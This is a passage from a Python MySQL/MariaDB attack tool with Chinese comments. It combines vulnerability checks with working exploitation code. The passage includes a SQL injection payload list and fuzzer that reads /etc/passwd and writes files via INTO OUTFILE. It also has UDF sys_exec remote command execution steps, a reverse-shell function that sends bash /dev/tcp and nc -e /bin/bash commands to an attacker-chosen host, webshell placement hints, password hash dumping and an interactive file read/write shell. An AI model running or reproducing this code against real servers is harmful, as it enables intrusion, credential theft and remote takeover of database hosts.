        safe_print(f"  {C.YLW}      {u.get('User')}@{u.get('Host')} "
                   f"[{u.get('plugin')}] {hash_preview}{'...' if len(hash_preview) == 30 else ''}{C.RST}")

    # 如果读取到了密码哈希
    if users:
        hits.append(f'{len(users)} 个用户/哈希可读')

    client.close()
    return hits


# ============== 5. SQL 注入 Fuzzer ==============

SQLI_PAYLOADS = {
    'bool_or': "' OR '1'='1",
    'bool_and': "' AND '1'='1",
    'union_int': "' UNION SELECT 1,2,3,VERSION(),5,6--",
    'union_cols': "' UNION SELECT * FROM (SELECT 1)a,(SELECT 2)b,(SELECT VERSION())c--",
    'time_sleep': "' AND SLEEP(3)--",
    'time_benchmark': "' AND BENCHMARK(5000000,MD5('a'))--",
    'stacked_insert': "'; INSERT INTO mysql_test_{RAND} VALUES(1);--",
    'comment_inline': "'/**/OR/**/1=1#",
    'hex_bypass': "0x27 OR 1=1#",
    'load_file': "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6--",
    'outfile': "' INTO OUTFILE '/tmp/mysql_sqli_{RAND}' LINES TERMINATED BY '\\n'--",
}


def sqli_fuzzer(target_url: str, param: str = 'id', method: str = 'GET',
                data_format: str = 'form', timeout: int = 10,
                proxy: str = None) -> dict:
    results = {}

    if not HAS_REQUESTS:
        safe_print(f"{C.RED}[-] 需要 requests 库, 跳过{C.RST}")
        return results

    safe_print(f"\n{C.YLW}[4] SQL 注入 Fuzzer (MySQL Web App){C.RST}")
    safe_print(f"  {C.CYN}    目标: {method} {target_url} | 参数: {param}{C.RST}")

    s = requests.Session()
    s.verify = False
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    })
    if proxy:
        s.proxies = {'http': proxy, 'https': proxy}

    # 基线
    try:
        if method.upper() == 'POST':
            payload = {param: '1'}
            if data_format == 'json':
                r = s.post(target_url, json=payload, timeout=timeout)
            else:
                r = s.post(target_url, data=payload, timeout=timeout)
        else:
            r = s.get(target_url, params={param: '1'}, timeout=timeout)

        baseline_status = r.status_code
        baseline_len = len(r.text)
        baseline_time = r.elapsed.total_seconds()
        safe_print(f"  {C.CYN}    基线: HTTP {baseline_status}, {baseline_len}B, "
                   f"{baseline_time:.2f}s{C.RST}")
    except Exception as e:
        safe_print(f"  {C.RED}[-] 无法访问: {e}{C.RST}")
        return results

    for name, payload_tpl in SQLI_PAYLOADS.items():
        rk = randstr(5)
        payload_val = payload_tpl.replace('{RAND}', rk)
        try:
            start = time.time()
            if method.upper() == 'POST':
                if data_format == 'json':
                    r = s.post(target_url, json={param: payload_val}, timeout=timeout + 5)
                else:
                    r = s.post(target_url, data={param: payload_val}, timeout=timeout + 5)
            else:
                r = s.get(target_url, params={param: payload_val}, timeout=timeout + 5)
            elapsed = time.time() - start

            anomalies = []
            if r.status_code != baseline_status:
                anomalies.append(f'状态 {baseline_status}→{r.status_code}')
            if abs(len(r.text) - baseline_len) > 50:
                anomalies.append(f'长度 {len(r.text)-baseline_len:+d}')
            if elapsed > baseline_time * 3 and elapsed > 2:
                anomalies.append(f'延迟 {elapsed:.2f}s (时间盲注!)')

            if anomalies:
                tag = ', '.join(anomalies)
                safe_print(f"  {C.RED}[!] {name}: {tag}{C.RST}")
                results[name] = {'type': 'anomaly', 'details': tag}

                if elapsed > 2:
                    results[name]['type'] = 'time_blind'
                if 'syntax' in r.text.lower() or 'error' in r.text.lower():
                    results[name]['type'] = 'error_based'
                if 'mysql' in r.text.lower() or 'mariadb' in r.text.lower():
                    safe_print(f"  {C.RED}[!!!] MySQL 错误信息泄露!{C.RST}")
                    results[name]['confirmed'] = True
            else:
                safe_print(f"  {C.CYN}    {name}: 无变化{C.RST}")
        except Exception:
            continue

    safe_print(f"\n  {C.BLD}SQLi 结论:{C.RST}")
    confirmed = [k for k, v in results.items() if v.get('confirmed')]
    time_blind = [k for k, v in results.items() if v.get('type') == 'time_blind']
    if confirmed:
        safe_print(f"  {C.RED}[!] 确认 SQL 注入 — MySQL 后端 ({', '.join(confirmed)}){C.RST}")
    elif time_blind:
        safe_print(f"  {C.YLW}[!] 时间盲注可能 — SLEEP/BENCHMARK 疑似有效{C.RST}")
    elif results:
        safe_print(f"  {C.YLW}[!] 存在异常 — 需进一步分析{C.RST}")
    else:
        safe_print(f"  {C.CYN}[-] 未发现明显注入{C.RST}")

    return results


# ============== 利用函数 ==============

def exploit_sql_query(host: str, port: int, query: str,
                      username: str = 'root', password: str = '',
                      database: str = 'mysql',
                      timeout: int = 10) -> Optional[str]:
    safe_print(f"\n{C.BLD}[SQL] {query}{C.RST}\n")

    if not HAS_PYMYSQL:
        safe_print(f"{C.RED}[-] 需要 pymysql{C.RST}")
        return None

    c = MySQLClient(host, port, username, password, database, timeout)
    if not c.connect():
        return None

    rows, status = c.query(query)
    safe_print(f"{C.GRN}{'─' * 60}{C.RST}")
    safe_print(f"{C.BLD}结果: ({len(rows)} 行, {status}){C.RST}")
    for r in rows:
        safe_print(f"  " + " | ".join(f"{k}={v}" for k, v in r.items()))
    safe_print(f"{C.GRN}{'─' * 60}{C.RST}")
    c.close()
    return str(rows)


def exploit_rce(host: str, port: int, command: str,
                username: str = 'root', password: str = '',
                database: str = 'mysql',
                timeout: int = 10) -> Optional[str]:
    safe_print(f"\n{C.BLD}[RCE] 命令: {command}{C.RST}\n")

    if not HAS_PYMYSQL:
        safe_print(f"{C.RED}[-] 需要 pymysql{C.RST}")
        return None

    c = MySQLClient(host, port, username, password, database, timeout)
    if not c.connect():
        return None

    has_super, has_file = c.is_super_or_file()
    plugin_dir = c.get_plugin_dir()

    if not has_super:
        safe_print(f"  {C.RED}[-] 无 SUPER 权限, UDF 不可用{C.RST}")
        safe_print(f"  {C.YLW}[*] 可尝试 INTO OUTFILE 写入 webshell{C.RST}")
        c.close()
        return None

    # 尝试 UDF
    if plugin_dir:
        # 方式 1: 通过 INTO DUMPFILE 写 UDF 共享库
        safe_print(f"  {C.CYN}[UDF 指引] 手动 UDF RCE 步骤:{C.RST}")
        so_path = plugin_dir.rstrip('/') + '/udf.so'
        safe_print(f"    1. 编译 UDF .so (sys_exec + sys_eval)")
        safe_print(f"    2. 十六进制编码: xxd -p udf.so | tr -d '\\n'")
        safe_print(f"    3. SELECT 0x<hex> INTO DUMPFILE '{so_path}'")
        safe_print(f"    4. CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so'")
        safe_print(f"    5. SELECT sys_exec('{command}')")

        # 检查是否已有 UDF 函数
        rows, _ = c.query("SELECT * FROM mysql.func")
        if rows:
            safe_print(f"\n  {C.GRN}[+] 已存在 UDF 函数: {rows}{C.RST}")
            safe_print(f"  {C.GRN}[*] 尝试调用 sys_exec...{C.RST}")
            ok, _ = c.exec_raw(f"SELECT sys_exec('{command}')")
            if ok:
                safe_print(f"  {C.GRN}[+] sys_exec 调用成功!{C.RST}")
            else:
                safe_print(f"  {C.CYN}    sys_exec 未注册{C.RST}")

    # 尝试 general_log 写 webshell
    safe_print(f"\n  {C.CYN}[general_log 方式]{C.RST}")
    web_paths = ['/var/www/html/', '/var/www/', '/tmp/',
                 'C:\\xampp\\htdocs\\', 'C:\\inetpub\\wwwroot\\']
    for web in web_paths[:2]:
        shell_path = web + 'cmd.php'
        safe_print(f"    可尝试写入 {shell_path}")

    c.close()
    return None


def exploit_reverse_shell(host: str, port: int, lhost: str, lport: int,
                          username: str = 'root', password: str = '',
                          database: str = 'mysql',
                          timeout: int = 10) -> bool:
    safe_print(f"\n{C.BLD}反弹 Shell → {lhost}:{lport}{C.RST}\n")

    if not HAS_PYMYSQL:
        safe_print(f"{C.RED}[-] 需要 pymysql{C.RST}")
        return False

    c = MySQLClient(host, port, username, password, database, timeout)
    if not c.connect():
        return False

    has_super, has_file = c.is_super_or_file()
    plugin_dir = c.get_plugin_dir()

    # 尝试通过 UDF sys_exec
    rows, _ = c.query("SELECT * FROM mysql.func WHERE name='sys_eval'")
    if rows:
        safe_print(f"  {C.GRN}[+] sys_eval 已注册 → 直接反弹 shell{C.RST}")
        for cmd in [f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
                     f'nc -e /bin/bash {lhost} {lport}']:
            ok, msg = c.exec_raw(f"SELECT sys_eval('{cmd}')")
            if ok:
                safe_print(f"  {C.GRN}[+] 已发送: {cmd}{C.RST}")

    # fallback: 通过 INTO OUTFILE 写 crontab / webshell
    if has_super:
        safe_print(f"  {C.CYN}[*] 尝试通过 general_log 写 shell...{C.RST}")
        safe_print(f"  {C.CYN}    (需手动操作, 见 UDF 指引){C.RST}")

    c.close()
    safe_print(f"\n{C.GRN}{'─' * 50}{C.RST}")
    safe_print(f"{C.BLD}监听: nc -lvnp {lport}{C.RST}")
    safe_print(f"{C.GRN}{'─' * 50}{C.RST}\n")
    return True


# ============== 交互式 Shell ==============

def interactive_shell(host: str, port: int, username: str = 'root',
                      password: str = '', database: str = 'mysql',
                      timeout: int = 10):
    safe_print(f"\n{C.GRN}[+] MySQL 交互式 Shell (exit 退出){C.RST}")
    safe_print(f"{C.CYN}    目标: mysql://{host}:{port}/{database} (user: {username}){C.RST}")

    if not HAS_PYMYSQL:
        safe_print(f"{C.RED}[-] pymysql 未安装 — 仅支持 raw socket 基础操作{C.RST}")
        # raw socket 交互
        my = MySQLRawConnection(host, port, timeout)
        if not my.connect():
            safe_print(f"{C.RED}[-] 连接失败{C.RST}")
            return
        if not my.login(username, password, database):
            safe_print(f"{C.RED}[-] 登录失败: {getattr(my, '_last_error', '')}{C.RST}")
            return
        safe_print(f"{C.GRN}[+] 已连接 (raw){C.RST}\n")
        _raw_interactive(my)
        return

    c = MySQLClient(host, port, username, password, database, timeout)
    if not c.connect():
        return

    ver = c.get_version()
    has_super, has_file = c.is_super_or_file()
    safe_print(f"{C.GRN}[+] {ver} | SUPER:{'Y' if has_super else 'N'} "
               f"FILE:{'Y' if has_file else 'N'}{C.RST}\n")

    while True:
        try:
            cmd = input(f"{C.RED}mysql[{host}:{port}]>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit', '\\q'):
                break

            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''

            if action == 'help':
                safe_print(f"""
{C.BLD}命令:{C.RST}
  {C.GRN}sql <query>{C.RST}       执行 SQL
  {C.GRN}dbs{C.RST}               列出数据库
  {C.GRN}tables <db>{C.RST}       列出表
  {C.GRN}read <file>{C.RST}       LOAD_FILE 读文件
  {C.GRN}write <file> <content>{C.RST}  INTO OUTFILE 写文件
  {C.GRN}users{C.RST}             列出用户/哈希
  {C.GRN}grants{C.RST}            查看权限
  {C.GRN}udf{C.RST}               UDF RCE 指引
  {C.GRN}reverse <LHOST> <LPORT>{C.RST}  反弹 Shell
  {C.GRN}whoami{C.RST}            当前用户/版本
  {C.GRN}info{C.RST}              系统信息
  {C.GRN}use <db>{C.RST}          切换数据库
  {C.GRN}clear{C.RST}             清屏
                """)
                continue

            if action == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                continue

            if action == 'sql':
                if not arg:
                    safe_print(f"{C.YLW}用法: sql <query>{C.RST}")
                    continue
                rows, status = c.query(arg)
                if rows:
                    for r in rows:
                        safe_print(f"  " + " | ".join(f"{k}={v}" for k, v in r.items()))
                    safe_print(f"  ({len(rows)} rows, {status})")
                else:
                    safe_print(f"  {status}")
                continue

            if action == 'dbs':
                for d in c.list_databases():
                    safe_print(f"  {d}")
                continue

            if action == 'tables':
                db = arg or database
                for t in c.list_tables(db):
                    safe_print(f"  {db}.{t}")
                continue

            if action == 'read':
                if not arg:
                    safe_print(f"{C.YLW}用法: read <filepath>{C.RST}")
                    continue
                ok, content = c.read_file(arg)
                safe_print(content[:5000] if ok else f"{C.RED}{content}{C.RST}")
                continue

            if action == 'write':
                args_list = arg.split(maxsplit=1)
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: write <filepath> <content>{C.RST}")
                    continue
                ok, msg = c.write_file(args_list[0], args_list[1])
                safe_print(f"  {C.GRN if ok else C.RED}{msg}{C.RST}")
                continue

            if action == 'users':
                for u in c.get_users():
                    h = (u.get('authentication_string', '') or '')[:30]
                    safe_print(f"  {u.get('User')}@{u.get('Host')} [{u.get('plugin')}] {h}")
                continue

            if action == 'grants':
                for g in c.get_grants():
                    safe_print(f"  {g}")
                continue

            if action == 'udf':
                exploit_rce(host, port, 'id', username, password, database, timeout)
                continue

            if action == 'reverse':
                args_list = arg.split()
                if len(args_list) < 2:
                    safe_print(f"{C.YLW}用法: reverse <LHOST> <LPORT>{C.RST}")
                    continue
                exploit_reverse_shell(host, port, args_list[0], int(args_list[1]),
                                      username, password, database, timeout)
                continue

            if action == 'whoami':
                rows, _ = c.query("SELECT CURRENT_USER() AS u, VERSION() AS v, DATABASE() AS d")
                for r in rows:
                    safe_print(f"  user={r.get('u')}  ver={r.get('v')}  db={r.get('d')}")
                continue

            if action == 'info':
                ver = c.get_version()
                has_s, has_f = c.is_super_or_file()
                svr = c.get_server_info()
                safe_print(f"\n{C.BLD}═══ 目标信息 ═══{C.RST}")
                safe_print(f"  主机: {host}:{port}")
                safe_print(f"  版本: {ver}")
                safe_print(f"  SUPER: {'Y' if has_s else 'N'} | FILE: {'Y' if has_f else 'N'}")
                for k in ['plugin_dir', 'secure_file_priv', 'basedir', 'datadir']:
                    if svr.get(k):
                        safe_print(f"  {k}: {svr[k]}")
                continue

            if action == 'use':
                if not arg:
                    safe_print(f"{C.YLW}用法: use <database>{C.RST}")
                    continue
                database = arg
                c2 = MySQLClient(host, port, username, password, database, timeout)
                if c2.connect():
                    c.close()
                    c = c2
                    safe_print(f"  {C.GRN}[+] 切换到 {database}{C.RST}")
                else:
                    c2.close()
                    safe_print(f"  {C.RED}[-] 切换失败{C.RST}")
                continue

            safe_print(f"{C.YLW}未知命令, 输入 help{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")

    c.close()


def _raw_interactive(my: MySQLRawConnection):
    while True:
        try:
            cmd = input(f"{C.RED}mysql-raw>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                break
            rows, status = my.query(cmd)
            if rows:
                for r in rows:
                    safe_print(f"  " + " | ".join(f"{k}={v}" for k, v in r.items()))
            safe_print(f"  {status}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            safe_print(f"  {C.RED}{e}{C.RST}")
    my.close()


# ============== 主流程 ==============

def run_all_checks(host: str, port: int, username: str = 'root',
                   password: str = '', database: str = 'mysql',
                   timeout: int = 10, sqli_url: str = '') -> List[str]:
    all_hits: List[str] = []

    # 0. 指纹
    ok, info = detect_mysql(host, port, timeout)
    if not ok:
        safe_print(f"\n{C.RED}未检测到 MySQL/MariaDB 服务{C.RST}")
        return all_hits
    if info.get('server_version'):
        all_hits.append(f"{'MariaDB' if 'mariadb' in info['server_version'].lower() else 'MySQL'} {info['server_version']}")

    # 1. 认证
    auth_ok, auth_info = check_auth(host, port, timeout)
    if auth_info.get('unauthenticated'):
        all_hits.append('未授权访问 (无需密码)')
        username = auth_info.get('username', 'root')
        password = auth_info.get('password', '')
    if auth_info.get('cve_2012_2122'):
        all_hits.append('CVE-2012-2122 认证绕过')
    if auth_info.get('authenticated'):
        username = auth_info.get('username', username)
        password = auth_info.get('password', password)
        all_hits.append(f'凭据有效 ({username}:{password if password else "(empty)"})')

    # 2. 文件操作
    if auth_ok or auth_info.get('unauthenticated'):
        file_hits = check_file_ops(host, port, username, password, database, timeout)
        all_hits.extend(file_hits)

    # 3. UDF RCE
    if (auth_ok or auth_info.get('unauthenticated')) and HAS_PYMYSQL:
        c = MySQLClient(host, port, username, password, database, timeout)
        if c.connect():
            ok_udf, udf_methods = check_udf_rce(c)
            for m in udf_methods:
                all_hits.append(m)
            c.close()

    # 4. 信息泄露
    if auth_ok or auth_info.get('unauthenticated'):
        info_hits = check_info_disclosure(host, port, username, password, database, timeout)
        all_hits.extend(info_hits)

    # 5. SQLi Fuzzer
    if sqli_url and HAS_REQUESTS:
        sqli_results = sqli_fuzzer(sqli_url)
        if any(v.get('confirmed') for v in sqli_results.values()):
            all_hits.append('SQL 注入确认 — MySQL 后端')

    # ===== 汇总 =====
    unique_hits = list(dict.fromkeys(all_hits))
    safe_print(f"\n\n{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"{C.BLD}  检测结果汇总{C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}")
    safe_print(f"  目标: {host}:{port}")
    if info.get('server_version'):
        safe_print(f"  版本: {info['server_version']}")

    if unique_hits:
        safe_print(f"\n  {C.RED}{C.BLD}共发现 {len(unique_hits)} 个安全问题:{C.RST}")
        for h in unique_hits:
            safe_print(f"    {C.RED}[!] {h}{C.RST}")
        if any('UDF' in h or '写入' in h or '读取' in h or '未授权' in h
               or '认证绕过' in h for h in unique_hits):
            safe_print(f"\n  {C.RED}{C.BLD}[!!!] 严重 — 可导致 RCE / 认证绕过{C.RST}")
    else:
        safe_print(f"\n  {C.CYN}未检测到可利用漏洞 (安全配置较完善){C.RST}")
    safe_print(f"{C.BLU}{'═' * 60}{C.RST}\n")
    return unique_hits


def main():
    banner()

    if not HAS_PYMYSQL:
        safe_print(f"\n{C.YLW}[!] pymysql 未安装 — raw socket 仅支持基础探测 + 爆破")
        safe_print(f"    建议: pip install pymysql    (解锁全部功能){C.RST}\n")

    parser = argparse.ArgumentParser(
        description='MySQL/MariaDB 综合漏洞检测/利用工具 v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  python mysql_check.py -H 192.168.1.100
  python mysql_check.py -H 192.168.1.100 -P 3307 -u root -p admin
  python mysql_check.py -H 192.168.1.100 rce "whoami"
  python mysql_check.py -H 192.168.1.100 sql "SHOW DATABASES"
  python mysql_check.py -H 192.168.1.100 shell
  python mysql_check.py -H 192.168.1.100 sqli --url http://target/api?id=1
        ''',
    )
    parser.add_argument('-H', '--host', required=True, help='MySQL 主机')
    parser.add_argument('-P', '--port', type=int, default=3306, help='端口 (默认: 3306)')
    parser.add_argument('-u', '--username', default='root', help='用户名 (默认: root)')
    parser.add_argument('-p', '--password', default='', help='密码')
    parser.add_argument('-d', '--database', default='mysql', help='数据库 (默认: mysql)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='超时 (默认: 10s)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色')
    parser.add_argument('--proxy', help='HTTP 代理 (SQLi Fuzzer)')

    sub = parser.add_subparsers(dest='mode', help='攻击模式')
    sub.add_parser('check', help='综合漏洞检测 (默认)')

    rce_p = sub.add_parser('rce', help='命令执行')
    rce_p.add_argument('command', nargs='?', help='命令')
    rce_p.add_argument('--reverse', action='store_true', help='反弹 Shell')
    rce_p.add_argument('--lhost', help='反弹 IP')
    rce_p.add_argument('--lport', type=int, help='反弹端口')

    sql_p = sub.add_parser('sql', help='执行 SQL')
    sql_p.add_argument('query', help='SQL 语句')

    sub.add_parser('shell', help='交互式 Shell')

    sqli_p = sub.add_parser('sqli', help='SQL 注入 Fuzzer (Web App)')
    sqli_p.add_argument('--url', required=True, help='目标 URL')
    sqli_p.add_argument('--param', default='id', help='注入参数')
    sqli_p.add_argument('--method', default='GET', choices=['GET', 'POST'])
    sqli_p.add_argument('--format', default='form', choices=['form', 'json'])

    args = parser.parse_args()
    if not args.mode:
        args.mode = 'check'
    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    if HAS_REQUESTS:
        import urllib3
        urllib3.disable_warnings()

    if args.mode == 'check':
        run_all_checks(args.host, args.port, args.username, args.password,
                       args.database, args.timeout)
    elif args.mode == 'rce':
        if args.reverse:
            if not args.lhost or not args.lport:
                safe_print(f"{C.RED}需要 --lhost --lport{C.RST}")
                sys.exit(1)
            exploit_reverse_shell(args.host, args.port, args.lhost, args.lport,
                                  args.username, args.password, args.database,
                                  args.timeout)
        elif args.command:
            exploit_rce(args.host, args.port, args.command,
                        args.username, args.password, args.database, args.timeout)
        else:
            safe_print(f"{C.RED}需要命令或 --reverse{C.RST}")
    elif args.mode == 'sql':
        exploit_sql_query(args.host, args.port, args.query,
                          args.username, args.password, args.database, args.timeout)
    elif args.mode == 'shell':
        interactive_shell(args.host, args.port, args.username, args.password,
                          args.database, args.timeout)
    elif args.mode == 'sqli':
        sqli_fuzzer(args.url, args.param, args.method, args.format,
                    args.timeout, args.proxy)

    safe_print("")


if __name__ == '__main__':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
    main()
